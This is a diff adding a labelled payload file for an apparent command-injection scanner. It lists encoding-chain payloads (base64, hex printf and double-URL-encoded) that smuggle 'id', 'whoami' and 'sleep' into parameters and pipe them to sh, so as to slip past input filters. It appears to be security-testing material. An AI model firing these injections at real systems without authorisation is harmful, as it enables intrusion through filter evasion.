@@ -1,0 +1,37 @@
+# @default_os:     linux
+# @default_signal: system:linux_id
+# @default_blind:  false
+# @default_tier:   5
+#
+# Encoding chain payloads.
+# Triggered when base64/hex/double_url filters detected.
+# These assume the server pre-decodes param values before passing to shell.
+# The injector's _detect_input_encoding() result should gate these.
+
+# @label: B64 wrap: echo b64|base64 -d|sh (id)
+# Note: payload below = ;echo aWQ=|base64 -d|sh
+;echo aWQ=|base64 -d|sh
+
+# @label: B64 wrap: echo b64|base64 -d|sh (whoami)
+# @signal: system:linux_user
+;echo d2hvYW1p|base64 -d|sh
+
+# @label: B64 wrap sleep 10
+# @signal: time
+# @blind: true
+;echo c2xlZXAgMTA=|base64 -d|sh
+
+# @label: Double-URL newline id
+# @signal: system:linux_id
+%250aid
+
+# @label: Double-URL pipe id
+# @signal: system:linux_id
+%257Cid
+
+# @label: Hex printf id
+;printf '\x69\x64'|sh
+
+# @label: Hex printf whoami
+# @signal: system:linux_user
+;printf '\x77\x68\x6f\x61\x6d\x69'|sh
